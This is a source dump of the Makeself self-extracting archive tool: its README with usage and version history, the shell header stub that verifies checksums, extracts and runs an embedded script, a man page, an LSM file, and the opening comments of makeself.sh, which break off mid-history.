[makeself.sh][1] is a small shell script that generates a self-extractable
compressed tar archive from a directory. The resulting file appears as a shell script
(many of those have a **.run** suffix), and can be launched as is. The archive
will then uncompress itself to a temporary directory and an optional arbitrary
command will be executed (for example an installation script). This is pretty
similar to archives generated with WinZip Self-Extractor in the Windows world.
Makeself archives also include checksums for integrity self-validation (CRC
and/or MD5 checksums).

The makeself.sh script itself is used only to create the archives from a
directory of files. The resultant archive is actually a compressed (using
gzip, bzip2, or compress) TAR archive, with a small shell script stub at the
beginning. This small stub performs all the steps of extracting the files,
running the embedded command, and removing the temporary files when done.
All the user has to do to install the software contained in such an
archive is to "run" the archive, i.e **sh nice-software.run**. I recommend
using the ".run" (which was introduced by some Makeself archives released by
Loki Software) or ".sh" suffix for such archives not to confuse the users,
so that they will know they are actually shell scripts (with quite a lot of binary data
attached to them though!).

I am trying to keep the code of this script as portable as possible, i.e it is
not relying on any bash-specific features and only calls commands that are
installed on any functioning UNIX-compatible system. This script as well as
the archives it generates should run on any Unix flavor, with any compatible
Bourne shell, provided of course that the compression programs are available.

As of version 2.1, Makeself has been rewritten and tested on the following
platforms :

  * Linux (all distributions)
  * Sun Solaris (8 and above)
  * HP-UX (tested on 11.0 and 11i on HPPA RISC)
  * SCO OpenUnix and OpenServer
  * IBM AIX 5.1L
  * MacOS X (Darwin)
  * SGI IRIX 6.5
  * FreeBSD
  * UnicOS / Cray
  * Cygwin (Windows)

If you successfully run Makeself and/or archives created with it on another
system, then please [let me know][2]!

Examples of publicly available archives made using makeself are :

  * Game patches and installers for [Id Software][3] games like Quake 3 for Linux or Return To Castle Wolfenstein ;
  * All game patches released by [Loki Software][4] for the Linux version of popular games ;
  * The [nVidia drivers][5] for Linux
  * The installer for the Linux version of [Google Earth][6]
  * The [VirtualBox][7] installers for Linux
  * The [Makeself][1] distribution itself ;-)
  * and countless others...

**Important note for Apache users:** By default, most Web servers will think that Makeself archives are regular text files and thus they may show up as text in a Web browser. The correct way to prevent this is to add a MIME type for this file format, like so (in httpd.conf) :

`AddType application/x-makeself .run`

**Important note for certain GNU/Linux distributions:** Archives created with Makeself prior to v2.1.2 were using an old syntax for the _head_ and _tail_ Unix commands that is being progressively obsoleted in their GNU forms. Therefore you may have problems uncompressing some of these archives. A workaround for this is to set the environment variable $_POSIX2_VERSION to enable the old syntax, i.e. :

`export _POSIX2_VERSION=199209`

## Usage

The syntax of makeself is the following:

`makeself.sh [args] archive_dir file_name label startup_script [script_args]`

  * _args_ are optional options for Makeself. The available ones are :

    * **--version** : Prints the version number on stdout, then exits immediately
    * **--gzip** : Use gzip for compression (the default on platforms on which gzip is commonly available, like Linux)
    * **--bzip2** : Use bzip2 instead of gzip for better compression. The bzip2 command must be available in the command path. It is recommended that the archive prefix be set to something like '.bz2.run', so that potential users know that they'll need bzip2 to extract it.
    * **--pbzip2** : Use pbzip2 instead of gzip for better and faster compression on machines having multiple CPUs. The pbzip2 command must be available in the command path. It is recommended that the archive prefix be set to something like '.bz2.run', so that potential users know that they'll need bzip2 to extract it.
    * **--xz** : Use xz instead of gzip for better compression. The xz command must be available in the command path. It is recommended that the archive prefix be set to something like '.xz.run' for the archive, so that potential users know that they'll need xz to extract it.
    * **--lzo** : Use lzop instead of gzip for better compression. The lzop command must be available in the command path. It is recommended that the archive prefix be set to something like '.lzo.run' for the archive, so that potential users know that they'll need lzop to extract it.
    * **--lz4** : Use lz4 instead of gzip for better compression. The lz4 command must be available in the command path. It is recommended that the archive prefix be set to something like '.lz4.run' for the archive, so that potential users know that they'll need lz4 to extract it.
    * **--base64** : Encode the archive to ASCII in Base64 format (base64 command required).
    * **--gpg-encrypt** : Encrypt the archive using "gpg -ac -z $COMPRESS_LEVEL". This will prompt for a password to encrypt with. Assumes that potential users have gpg installed.
    * **--ssl-encrypt** : Encrypt the archive using "openssl aes-256-cbc -a -salt". This will prompt for a password to encrypt with. Assumes that the potential users have openssl installed. 
    * **--compress** : Use the UNIX "compress" command to compress the data. This should be the default on all platforms that don't have gzip available.
    * **--nocomp** : Do not use any compression for the archive, which will then be an uncompressed TAR.
    * **--complevel** : Specify the compression level for gzip,bzip2,pbzip2,xz,lzo or lz4. (default to 9)
    * **--notemp** : The generated archive will not extract the files to a temporary directory, but in a new directory created in the current directory. This is better to distribute software packages that may extract and compile by themselves (i.e. launch the compilation through the embedded script).
    * **--current** : Files will be extracted to the current directory, instead of in a subdirectory. This option implies **--notemp** above.
    * **--follow** : Follow the symbolic links inside of the archive directory, i.e. store the files that are being pointed to instead of the links themselves.
    * **--append** _(new in 2.1.x)_: Append data to an existing archive, instead of creating a new one. In this mode, the settings from the original archive are reused (compression type, label, embedded script), and thus don't need to be specified again on the command line.
    * **--header** : Makeself 2.0 uses a separate file to store the header stub, called "makeself-header.sh". By default, it is assumed that it is stored in the same location as makeself.sh. This option can be used to specify its actual location if it is stored someplace else.
    * **--copy** : Upon extraction, the archive will first extract itself to a temporary directory. The main application of this is to allow self-contained installers stored in a Makeself archive on a CD, when the installer program will later need to unmount the CD and allow a new one to be inserted. This prevents "Filesystem busy" errors for installers that span multiple CDs.
    * **--nox11** : Disable the automatic spawning of a new terminal in X11.
    * **--nowait** : When executed from a new X11 terminal, disable the user prompt at the end of the script execution.
    * **--nomd5** and **--nocrc** : Disable the creation of a MD5 / CRC checksum for the archive. This speeds up the extraction process if integrity checking is not necessary.
    * **--lsm _file_** : Provide and LSM file to makeself, that will be embedded in the generated archive. LSM files are describing a software package in a way that is easily parseable. The LSM entry can then be later retrieved using the '-lsm' argument to the archive. An exemple of a LSM file is provided with Makeself.
    * **--tar-extra opt** : Append more options to the tar command line.
    * **--keep-umask** : Keep the umask set to shell default, rather than overriding when executing self-extracting archive.
  * _archive_dir_ is the name of the directory that contains the files to be archived
  * _file_name_ is the name of the archive to be created
  * _label_ is an arbitrary text string describing the package. It will be displayed while extracting the files.
  * _startup_script_ is the command to be executed _from within_ the directory of extracted files. Thus, if you wish to execute a program contain in this directory, you must prefix your command with "./". For example, ./program will be fine. The _script_args_ are additionnal arguments for this command.

Here is an example, assuming the user has a package image stored in a
**/home/joe/mysoft**, and he wants to generate a self-extracting package named
**mysoft.sh**, which will launch the "setup" script initially stored in
/home/joe/mysoft :

`makeself.sh /home/joe/mysoft mysoft.sh "Joe's Nice Software Package" ./setup
`

Here is also how I created the [makeself.run][1] archive which contains the
Makeself distribution :

`makeself.sh --notemp makeself makeself.run "Makeself by Stephane Peter" echo
"Makeself has extracted itself" `

Archives generated with Makeself 2.1 can be passed the following arguments:

  * _--keep_ : Prevent the files to be extracted in a temporary directory that will be removed after the embedded script's execution. The files will then be extracted in the current working directory and will stay here until you remove them.
  * _--verbose_ : Will prompt the user before executing the embedded command
  * _--target dir_ : Allows to extract the archive in an arbitrary place.
  * _--nox11_ : Do not spawn a X11 terminal.
  * _--confirm_ : Prompt the user for confirmation before running the embedded command.
  * _--info_ : Print out general information about the archive (does not extract).
  * _--lsm_ : Print out the LSM entry, if it is present.
  * _--list_ : List the files in the archive.
  * _--check_ : Check the archive for integrity using the embedded checksums. Does not extract the archive.
  * _--nochown_ : By default, a "chown -R" command is run on the target directory after extraction, so that all files belong to the current user. This is mostly needed if you are running as root, as tar will then try to recreate the initial user ownerships. You may disable this behavior with this flag.
  * _--tar_ : Run the tar command on the contents of the archive, using the following arguments as parameter for the command.
  * _--noexec_ : Do not run the embedded script after extraction.

Any subsequent arguments to the archive will be passed as additional arguments
to the embedded command. You must explicitly use the _--_ special command-
line construct before any such options to make sure that Makeself will not try
to interpret them.

## License

Makeself is covered by the [GNU General Public License][8] (GPL) version 2 and
above. Archives generated by Makeself don't have to be placed under this
license (although I encourage it ;-)), since the archive itself is merely data
for Makeself.

## Download

Get the latest official distribution [here][9] (version 2.2.0).

The latest development version can be grabbed from [GitHub][10]. Feel free to
submit any patches there through the fork and pull request process.

## Version history

  * **v1.0:** Initial public release
  * **v1.1:** The archive can be passed parameters that will be passed on to the embedded script, thanks to John C. Quillan
  * **v1.2:** Cosmetic updates, support for bzip2 compression and non-temporary archives. Many ideas thanks to Francois Petitjean.
  * **v1.3:** More patches from Bjarni R. Einarsson and Francois Petitjean: Support for no compression (--nocomp), script is no longer mandatory, automatic launch in an xterm, optional verbose output, and -target archive option to indicate where to extract the files.
  * **v1.4:** Many patches from Francois Petitjean: improved UNIX compatibility, automatic integrity checking, support of LSM files to get info on the package at run time..
  * **v1.5.x:** A lot of bugfixes, and many other patches, including automatic verification through the usage of checksums. Version 1.5.5 was the stable release for a long time, even though the Web page didn't get updated ;-). Makeself was also officially made a part of the [Loki Setup installer][11], and its source is being maintained as part of this package.
  * **v2.0:** Complete internal rewrite of Makeself. The command-line parsing was vastly improved, the overall maintenance of the package was greatly improved by separating the stub from makeself.sh. Also Makeself was ported and tested to a variety of Unix platforms.
  * **v2.0.1:** First public release of the new 2.0 branch. Prior versions are officially obsoleted. This release introduced the '--copy' argument that was introduced in response to a need for the [UT2K3][12] Linux installer.
  * **v2.1.0:** Big change : Makeself can now support multiple embedded tarballs, each stored separately with their own checksums. An existing archive can be updated with the --append flag. Checksums are also better managed, and the --nochown option for archives appeared.
  * **v2.1.1:** Fixes related to the Unix compression (compress command). Some Linux distributions made the insane choice to make it unavailable, even though gzip is capable of uncompressing these files, plus some more bugfixes in the extraction and checksum code.
  * **v2.1.2:** Some bug fixes. Use head -n to avoid problems with POSIX conformance.
  * **v2.1.3:** Bug fixes with the command line when spawning terminals. Added --tar, --noexec for archives. Added --nomd5 and --nocrc to avoid creating checksums in archives. The embedded script is now run through "eval". The --info output now includes the command used to create the archive. A man page was contributed by Bartosz Fenski.
  * **v2.1.4:** Fixed --info output. Generate random directory name when extracting files to . to avoid problems. Better handling of errors with wrong permissions for the directory containing the files. Avoid some race conditions, Unset the $CDPATH variable to avoid problems if it is set. Better handling of dot files in the archive directory.
  * **v2.1.5:** Made the md5sum detection consistent with the header code. Check for the presence of the archive directory. Added --encrypt for symmetric encryption through gpg (Eric Windisch). Added support for the digest command on Solaris 10 for MD5 checksums. Check for available disk space before extracting to the target directory (Andreas Schweitzer). Allow extraction to run asynchronously (patch by Peter Hatch). Use file descriptors internally to avoid error messages (patch by Kay Tiong Khoo).
  * **v2.1.6:** Replaced one dot per file progress with a realtime progress percentage and a spining cursor. Added --noprogress to prevent showing the progress during the decompression. Added --target dir to allow extracting directly to a target directory. (Guy Baconniere)
  * **v2.2.0:** First major new release in years! Includes many bugfixes and user contributions. Please look at the [project page on Github][10] for all the details.

## Links

  * Check out the ["Loki Setup"][11] installer, used to install many Linux games and other applications, and of which I am the co-author. Since the demise of Loki, I am now the official maintainer of the project, and it is now being hosted on [icculus.org][13], as well as a bunch of other ex-Loki projects (and a lot of other good stuff!).
  * Bjarni R. Einarsson also wrote the **setup.sh** installer script, inspired by Makeself. [Check it out !][14]

## Contact

This script was written by [Stéphane Peter][2] (megastep at megastep.org). Any enhancements and suggestions are welcome.

Contributions were included from John C. Quillan, Bjarni R. Einarsson,
Francois Petitjean, Ryan C. Gordon, and many contributors on GitHub. If you think I forgot
your name, don't hesitate to contact me.

This project is now hosted on GitHub. Feel free to submit patches and bug reports on the [project page][10].

* * *

[Stephane Peter][2]

   [1]: makeself.run
   [2]: mailto:megastep@megastep.org
   [3]: http://www.idsoftware.com/
   [4]: http://www.lokigames.com/products/myth2/updates.php3
   [5]: http://www.nvidia.com/
   [6]: http://earth.google.com/
   [7]: http://www.virtualbox.org/
   [8]: http://www.gnu.org/copyleft/gpl.html
   [9]: http://cdn.megastep.org/makeself/makeself-2.2.0.run
   [10]: http://github.com/megastep/makeself
   [11]: http://www.icculus.org/loki_setup/
   [12]: http://www.unrealtournament2003.com/
   [13]: http://www.icculus.org/
   [14]: http://bre.klaki.net/programs/setup.sh/

```

`Tools/makeself/makeself-header.sh`:

```sh
cat << EOF  > "$archname"
#!/bin/sh
# This script was generated using Makeself $MS_VERSION

ORIG_UMASK=\`umask\`
if test "$KEEP_UMASK" = n; then
    umask 077
fi

CRCsum="$CRCsum"
MD5="$MD5sum"
TMPROOT=\${TMPDIR:=/tmp}
USER_PWD="\$PWD"; export USER_PWD

label="$LABEL"
script="$SCRIPT"
scriptargs="$SCRIPTARGS"
licensetxt="$LICENSE"
helpheader='$HELPHEADER'
targetdir="$archdirname"
filesizes="$filesizes"
keep="$KEEP"
nooverwrite="$NOOVERWRITE"
quiet="n"

print_cmd_arg=""
if type printf > /dev/null; then
    print_cmd="printf"
elif test -x /usr/ucb/echo; then
    print_cmd="/usr/ucb/echo"
else
    print_cmd="echo"
fi

unset CDPATH

MS_Printf()
{
    \$print_cmd \$print_cmd_arg "\$1"
}

MS_PrintLicense()
{
  if test x"\$licensetxt" != x; then
    echo "\$licensetxt"
    while true
    do
      MS_Printf "Please type y to accept, n otherwise: "
      read yn
      if test x"\$yn" = xn; then
        keep=n
	eval \$finish; exit 1
        break;
      elif test x"\$yn" = xy; then
        break;
      fi
    done
  fi
}

MS_diskspace()
{
	(
	if test -d /usr/xpg4/bin; then
		PATH=/usr/xpg4/bin:\$PATH
	fi
	df -kP "\$1" | tail -1 | awk '{ if (\$4 ~ /%/) {print \$3} else {print \$4} }'
	)
}

MS_dd()
{
    blocks=\`expr \$3 / 1024\`
    bytes=\`expr \$3 % 1024\`
    dd if="\$1" ibs=\$2 skip=1 obs=1024 conv=sync 2> /dev/null | \\
    { test \$blocks -gt 0 && dd ibs=1024 obs=1024 count=\$blocks ; \\
      test \$bytes  -gt 0 && dd ibs=1 obs=1024 count=\$bytes ; } 2> /dev/null
}

MS_dd_Progress()
{
    if test x"\$noprogress" = xy; then
        MS_dd \$@
        return \$?
    fi
    file="\$1"
    offset=\$2
    length=\$3
    pos=0
    bsize=4194304
    while test \$bsize -gt \$length; do
        bsize=\`expr \$bsize / 4\`
    done
    blocks=\`expr \$length / \$bsize\`
    bytes=\`expr \$length % \$bsize\`
    (
        dd ibs=\$offset skip=1 2>/dev/null
        pos=\`expr \$pos \+ \$bsize\`
        MS_Printf "     0%% " 1>&2
        if test \$blocks -gt 0; then
            while test \$pos -le \$length; do
                dd bs=\$bsize count=1 2>/dev/null
                pcent=\`expr \$length / 100\`
                pcent=\`expr \$pos / \$pcent\`
                if test \$pcent -lt 100; then
                    MS_Printf "\b\b\b\b\b\b\b" 1>&2
                    if test \$pcent -lt 10; then
                        MS_Printf "    \$pcent%% " 1>&2
                    else
                        MS_Printf "   \$pcent%% " 1>&2
                    fi
                fi
                pos=\`expr \$pos \+ \$bsize\`
            done
        fi
        if test \$bytes -gt 0; then
            dd bs=\$bytes count=1 2>/dev/null
        fi
        MS_Printf "\b\b\b\b\b\b\b" 1>&2
        MS_Printf " 100%%  " 1>&2
    ) < "\$file"
}

MS_Help()
{
    cat << EOH >&2
\${helpheader}Makeself version $MS_VERSION
 1) Getting help or info about \$0 :
  \$0 --help   Print this message
  \$0 --info   Print embedded info : title, default target directory, embedded script ...
  \$0 --lsm    Print embedded lsm entry (or no LSM)
  \$0 --list   Print the list of files in the archive
  \$0 --check  Checks integrity of the archive

 2) Running \$0 :
  \$0 [options] [--] [additional arguments to embedded script]
  with following options (in that order)
  --confirm             Ask before running embedded script
  --quiet		Do not print anything except error messages
  --noexec              Do not run embedded script
  --keep                Do not erase target directory after running
			the embedded script
  --noprogress          Do not show the progress during the decompression
  --nox11               Do not spawn an xterm
  --nochown             Do not give the extracted files to the current user
  --target dir          Extract directly to a target directory
                        directory path can be either absolute or relative
  --tar arg1 [arg2 ...] Access the contents of the archive through the tar command
  --                    Following arguments will be passed to the embedded script
EOH
}

MS_Check()
{
    OLD_PATH="\$PATH"
    PATH=\${GUESS_MD5_PATH:-"\$OLD_PATH:/bin:/usr/bin:/sbin:/usr/local/ssl/bin:/usr/local/bin:/opt/openssl/bin"}
	MD5_ARG=""
    MD5_PATH=\`exec <&- 2>&-; which md5sum || command -v md5sum || type md5sum\`
    test -x "\$MD5_PATH" || MD5_PATH=\`exec <&- 2>&-; which md5 || command -v md5 || type md5\`
	test -x "\$MD5_PATH" || MD5_PATH=\`exec <&- 2>&-; which digest || command -v digest || type digest\`
    PATH="\$OLD_PATH"

    if test x"\$quiet" = xn; then
		MS_Printf "Verifying archive integrity..."
    fi
    offset=\`head -n $SKIP "\$1" | wc -c | tr -d " "\`
    verb=\$2
    i=1
    for s in \$filesizes
    do
		crc=\`echo \$CRCsum | cut -d" " -f\$i\`
		if test -x "\$MD5_PATH"; then
			if test x"\`basename \$MD5_PATH\`" = xdigest; then
				MD5_ARG="-a md5"
			fi
			md5=\`echo \$MD5 | cut -d" " -f\$i\`
			if test x"\$md5" = x00000000000000000000000000000000; then
				test x"\$verb" = xy && echo " \$1 does not contain an embedded MD5 checksum." >&2
			else
				md5sum=\`MS_dd_Progress "\$1" \$offset \$s | eval "\$MD5_PATH \$MD5_ARG" | cut -b-32\`;
				if test x"\$md5sum" != x"\$md5"; then
					echo "Error in MD5 checksums: \$md5sum is different from \$md5" >&2
					exit 2
				else
					test x"\$verb" = xy && MS_Printf " MD5 checksums are OK." >&2
				fi
				crc="0000000000"; verb=n
			fi
		fi
		if test x"\$crc" = x0000000000; then
			test x"\$verb" = xy && echo " \$1 does not contain a CRC checksum." >&2
		else
			sum1=\`MS_dd_Progress "\$1" \$offset \$s | CMD_ENV=xpg4 cksum | awk '{print \$1}'\`
			if test x"\$sum1" = x"\$crc"; then
				test x"\$verb" = xy && MS_Printf " CRC checksums are OK." >&2
			else
				echo "Error in checksums: \$sum1 is different from \$crc" >&2
				exit 2;
			fi
		fi
		i=\`expr \$i + 1\`
		offset=\`expr \$offset + \$s\`
    done
    if test x"\$quiet" = xn; then
		echo " All good."
    fi
}

UnTAR()
{
    if test x"\$quiet" = xn; then
		tar \$1vf - 2>&1 || { echo Extraction failed. > /dev/tty; kill -15 \$$; }
    else

		tar \$1f - 2>&1 || { echo Extraction failed. > /dev/tty; kill -15 \$$; }
    fi
}

finish=true
xterm_loop=
noprogress=$NOPROGRESS
nox11=$NOX11
copy=$COPY
ownership=y
verbose=n

initargs="\$@"

while true
do
    case "\$1" in
    -h | --help)
	MS_Help
	exit 0
	;;
    -q | --quiet)
	quiet=y
	noprogress=y
	shift
	;;
    --info)
	echo Identification: "\$label"
	echo Target directory: "\$targetdir"
	echo Uncompressed size: $USIZE KB
	echo Compression: $COMPRESS
	echo Date of packaging: $DATE
	echo Built with Makeself version $MS_VERSION on $OSTYPE
	echo Build command was: "$MS_COMMAND"
	if test x"\$script" != x; then
	    echo Script run after extraction:
	    echo "    " \$script \$scriptargs
	fi
	if test x"$copy" = xcopy; then
		echo "Archive will copy itself to a temporary location"
	fi
	if test x"$KEEP" = xy; then
	    echo "directory \$targetdir is permanent"
	else
	    echo "\$targetdir will be removed after extraction"
	fi
	exit 0
	;;
    --dumpconf)
	echo LABEL=\"\$label\"
	echo SCRIPT=\"\$script\"
	echo SCRIPTARGS=\"\$scriptargs\"
	echo archdirname=\"$archdirname\"
	echo KEEP=$KEEP
	echo NOOVERWRITE=$NOOVERWRITE
	echo COMPRESS=$COMPRESS
	echo filesizes=\"\$filesizes\"
	echo CRCsum=\"\$CRCsum\"
	echo MD5sum=\"\$MD5\"
	echo OLDUSIZE=$USIZE
	echo OLDSKIP=`expr $SKIP + 1`
	exit 0
	;;
    --lsm)
cat << EOLSM
EOF
eval "$LSM_CMD"
cat << EOF  >> "$archname"
EOLSM
	exit 0
	;;
    --list)
	echo Target directory: \$targetdir
	offset=\`head -n $SKIP "\$0" | wc -c | tr -d " "\`
	for s in \$filesizes
	do
	    MS_dd "\$0" \$offset \$s | eval "$GUNZIP_CMD" | UnTAR t
	    offset=\`expr \$offset + \$s\`
	done
	exit 0
	;;
	--tar)
	offset=\`head -n $SKIP "\$0" | wc -c | tr -d " "\`
	arg1="\$2"
    if ! shift 2; then MS_Help; exit 1; fi
	for s in \$filesizes
	do
	    MS_dd "\$0" \$offset \$s | eval "$GUNZIP_CMD" | tar "\$arg1" - "\$@"
	    offset=\`expr \$offset + \$s\`
	done
	exit 0
	;;
    --check)
	MS_Check "\$0" y
	exit 0
	;;
    --confirm)
	verbose=y
	shift
	;;
	--noexec)
	script=""
	shift
	;;
    --keep)
	keep=y
	shift
	;;
    --target)
	keep=y
	targetdir=\${2:-.}
    if ! shift 2; then MS_Help; exit 1; fi
	;;
    --noprogress)
	noprogress=y
	shift
	;;
    --nox11)
	nox11=y
	shift
	;;
    --nochown)
	ownership=n
	shift
	;;
    --xwin)
	if test "$NOWAIT" = n; then
		finish="echo Press Return to close this window...; read junk"
	fi
	xterm_loop=1
	shift
	;;
    --phase2)
	copy=phase2
	shift
	;;
    --)
	shift
	break ;;
    -*)
	echo Unrecognized flag : "\$1" >&2
	MS_Help
	exit 1
	;;
    *)
	break ;;
    esac
done

if test x"\$quiet" = xy -a x"\$verbose" = xy; then
	echo Cannot be verbose and quiet at the same time. >&2
	exit 1
fi

if test x"\$copy" \!= xphase2; then
    MS_PrintLicense
fi

case "\$copy" in
copy)
    tmpdir=\$TMPROOT/makeself.\$RANDOM.\`date +"%y%m%d%H%M%S"\`.\$\$
    mkdir "\$tmpdir" || {
	echo "Could not create temporary directory \$tmpdir" >&2
	exit 1
    }
    SCRIPT_COPY="\$tmpdir/makeself"
    echo "Copying to a temporary location..." >&2
    cp "\$0" "\$SCRIPT_COPY"
    chmod +x "\$SCRIPT_COPY"
    cd "\$TMPROOT"
    exec "\$SCRIPT_COPY" --phase2 -- \$initargs
    ;;
phase2)
    finish="\$finish ; rm -rf \`dirname \$0\`"
    ;;
esac

if test x"\$nox11" = xn; then
    if tty -s; then                 # Do we have a terminal?
	:
    else
        if test x"\$DISPLAY" != x -a x"\$xterm_loop" = x; then  # No, but do we have X?
            if xset q > /dev/null 2>&1; then # Check for valid DISPLAY variable
                GUESS_XTERMS="xterm gnome-terminal rxvt dtterm eterm Eterm xfce4-terminal lxterminal kvt konsole aterm terminology"
                for a in \$GUESS_XTERMS; do
                    if type \$a >/dev/null 2>&1; then
                        XTERM=\$a
                        break
                    fi
                done
                chmod a+x \$0 || echo Please add execution rights on \$0
                if test \`echo "\$0" | cut -c1\` = "/"; then # Spawn a terminal!
                    exec \$XTERM -title "\$label" -e "\$0" --xwin "\$initargs"
                else
                    exec \$XTERM -title "\$label" -e "./\$0" --xwin "\$initargs"
                fi
            fi
        fi
    fi
fi

if test x"\$targetdir" = x.; then
    tmpdir="."
else
    if test x"\$keep" = xy; then
	if test x"\$nooverwrite" = xy && test -d "\$targetdir"; then
            echo "Target directory \$targetdir already exists, aborting." >&2
            exit 1
	fi
	if test x"\$quiet" = xn; then
	    echo "Creating directory \$targetdir" >&2
	fi
	tmpdir="\$targetdir"
	dashp="-p"
    else
	tmpdir="\$TMPROOT/selfgz\$\$\$RANDOM"
	dashp=""
    fi
    mkdir \$dashp \$tmpdir || {
	echo 'Cannot create target directory' \$tmpdir >&2
	echo 'You should try option --target dir' >&2
	eval \$finish
	exit 1
    }
fi

location="\`pwd\`"
if test x"\$SETUP_NOCHECK" != x1; then
    MS_Check "\$0"
fi
offset=\`head -n $SKIP "\$0" | wc -c | tr -d " "\`

if test x"\$verbose" = xy; then
	MS_Printf "About to extract $USIZE KB in \$tmpdir ... Proceed ? [Y/n] "
	read yn
	if test x"\$yn" = xn; then
		eval \$finish; exit 1
	fi
fi

if test x"\$quiet" = xn; then
	MS_Printf "Uncompressing \$label"
fi
res=3
if test x"\$keep" = xn; then
    trap 'echo Signal caught, cleaning up >&2; cd \$TMPROOT; /bin/rm -rf \$tmpdir; eval \$finish; exit 15' 1 2 3 15
fi

leftspace=\`MS_diskspace \$tmpdir\`
if test -n "\$leftspace"; then
    if test "\$leftspace" -lt $USIZE; then
        echo
        echo "Not enough space left in "\`dirname \$tmpdir\`" (\$leftspace KB) to decompress \$0 ($USIZE KB)" >&2
        if test x"\$keep" = xn; then
            echo "Consider setting TMPDIR to a directory with more free space."
        fi
        eval \$finish; exit 1
    fi
fi

for s in \$filesizes
do
    if MS_dd_Progress "\$0" \$offset \$s | eval "$GUNZIP_CMD" | ( cd "\$tmpdir"; umask \$ORIG_UMASK ; UnTAR xp ) 1>/dev/null; then
		if test x"\$ownership" = xy; then
			(PATH=/usr/xpg4/bin:\$PATH; cd "\$tmpdir"; chown -R \`id -u\` .;  chgrp -R \`id -g\` .)
		fi
    else
		echo >&2
		echo "Unable to decompress \$0" >&2
		eval \$finish; exit 1
    fi
    offset=\`expr \$offset + \$s\`
done
if test x"\$quiet" = xn; then
	echo
fi

cd "\$tmpdir"
res=0
if test x"\$script" != x; then
    if test x"\$verbose" = x"y"; then
		MS_Printf "OK to execute: \$script \$scriptargs \$* ? [Y/n] "
		read yn
		if test x"\$yn" = x -o x"\$yn" = xy -o x"\$yn" = xY; then
			eval "\"\$script\" \$scriptargs \"\\\$@\""; res=\$?;
		fi
    else
		eval "\"\$script\" \$scriptargs \"\\\$@\""; res=\$?
    fi
    if test "\$res" -ne 0; then
		test x"\$verbose" = xy && echo "The program '\$script' returned an error code (\$res)" >&2
    fi
fi
if test x"\$keep" = xn; then
    /bin/rm -rf "\$0"
    cd \$TMPROOT
    /bin/rm -rf \$tmpdir
fi
eval \$finish; exit \$res
EOF

```

`Tools/makeself/makeself.1`:

```1
.TH "makeself" "1" "2.1.6"
.SH "NAME"
makeself \- An utility to generate self-extractable archives.
.SH "SYNTAX"
.LP 
.B makeself [\fIoptions\fP] archive_dir file_name label 
.B [\fIstartup_script\fP] [\fIargs\fP]
.SH "DESCRIPTION"
.LP 
This program is a free (GPL) utility designed to create self-extractable 
archives from a directory. 
.br
.SH "OPTIONS"
.LP 
The following options are supported.
.LP 
.TP 15
.B -v, --version
Prints out the makeself version number and exits.
.TP
.B -h, --help
Print out help information.
.TP
.B --tar-quietly
Suppress verbose output from the tar command
.TP
.B --quiet
Do not print any messages other than errors
.TP
.B --gzip
Compress using gzip (default if detected).
.TP
.B --bzip2
Compress using bzip2.
.TP
.B --pbzip2
Compress using pbzip2.
.TP
.B --xz
Compress using xz.
.TP
.B --lzo
Compress using lzop.
.TP
.B --lz4
Compress using lz4.
.TP
.B --compress
Compress using the UNIX 'compress' command.
.TP
.B --nocomp
Do not compress the data.
.TP
.B --complevel lvl
Specify the compression level for gzip,bzip2,pbzui2,xz,lzo or lz4
.TP
.B --notemp
The archive will create archive_dir in the current directory and 
uncompress in ./archive_dir.
.TP
.B --copy
Upon extraction, the archive will first copy itself to a temporary directory.
.TP
.B --append
Append more files to an existing makeself archive. The label and startup scripts will then be ignored.
.TP
.B --current
Files will be extracted to the current directory. Both --current and --target dir imply --notemp.
.TP
.B --target dir
Extract directly to a target directory. Directory path can be either absolute or relative.
.TP
.B --header file
Specify location of the header script. 
.TP
.B --follow
Follow the symlinks in the archive.
.TP
.B --noprogress
Do not show the progress during the decompression.
.TP
.B --nox11
Disable automatic spawn of an xterm if running in X11.
.TP
.B --nowait
Do not wait for user input after executing embedded program from an xterm.
.TP
.B --nomd5
Do not create a MD5 checksum for the archive.
.TP
.B --nocrc
Do not create a CRC32 checksum for the archive.
.TP
.B --lsm file
LSM file describing the package.
.PD
.SH "AUTHORS"
.LP 
Makeself has been written by Stéphane Peter <megastep@megastep.org>.
.BR 
This man page was originally written by Bartosz Fenski <fenio@o2.pl> for the 
Debian GNU/Linux distribution (but it may be used by others).

```

`Tools/makeself/makeself.lsm`:

```lsm
Begin3
Title:          makeself.sh
Version:        2.2.0
Description:    makeself.sh is a shell script that generates a self-extractable        
                tar.gz archive from a directory. The resulting file appears as a shell          
                script, and can be launched as is. The archive will then uncompress
                itself to a temporary directory and an arbitrary command will be
                executed (for example an installation script). This is pretty similar
                to archives generated with WinZip Self-Extractor in the Windows world.
Keywords:       Installation archive tar winzip
Author:         Stephane Peter (megastep@megastep.org)
Maintained-by:  Stephane Peter (megastep@megastep.org)
Original-site:  http://github.com/megastep/makeself
Platform:       Unix
Copying-policy: GPL
End

```

`Tools/makeself/makeself.sh`:

```sh
#!/bin/sh
#
# Makeself version 2.2.x
#  by Stephane Peter <megastep@megastep.org>
#
# Utility to create self-extracting tar.gz archives.
# The resulting archive is a file holding the tar.gz archive with
# a small Shell script stub that uncompresses the archive to a temporary
# directory and then executes a given script from withing that directory.
#
# Makeself home page: http://www.megastep.org/makeself/
#
# Version 2.0 is a rewrite of version 1.0 to make the code easier to read and maintain.
#
# Version history :
# - 1.0 : Initial public release
# - 1.1 : The archive can be passed parameters that will be passed on to
#         the embedded script, thanks to John C. Quillan
# - 1.2 : Package distribution, bzip2 compression, more command line options,
#         support for non-temporary archives. Ideas thanks to Francois Petitjean
# - 1.3 : More patches from Bjarni R. Einarsson and Francois Petitjean:
#         Support for no compression (--nocomp), script is no longer mandatory,
#         automatic launch in an xterm, optional verbose output, and -target 
#         archive option to indicate where to extract the files.
# - 1.4 : Improved UNIX compatibility (Francois Petitjean)
#         Automatic integrity checking, support of LSM files (Francois Petitjean)
# - 1.5 : Many bugfixes. Optionally disable xterm spawning.
# - 1.5.1 : More bugfixes, added archive options -list and -check.
# - 1.5.2 : Cosmetic changes to inform the user of what's going on with big 
#           archives (Quake III demo)
# - 1.5.3 : Check for validity of the DISPLAY variable before launching an xterm.
#           More verbosity in xterms and check for embedded command's return value.
#           Bugfix for Debian 2.0 systems that have a different "print" command.
# - 1.5.4 : Many bugfixes. Print out a message if the extraction failed.
# - 1.5.5 : More bugfixes. Added support for SETUP_NOCHECK environment variable to
#           bypass checksum verification of archives.
# - 1.6.0 : Compute MD5 checksums with the md5sum command (patch from Ryan Gordon)
# - 2.0   : Brand new rewrite, cleaner architecture, separated header and UNIX ports.
# - 2.0.1 : Added --copy
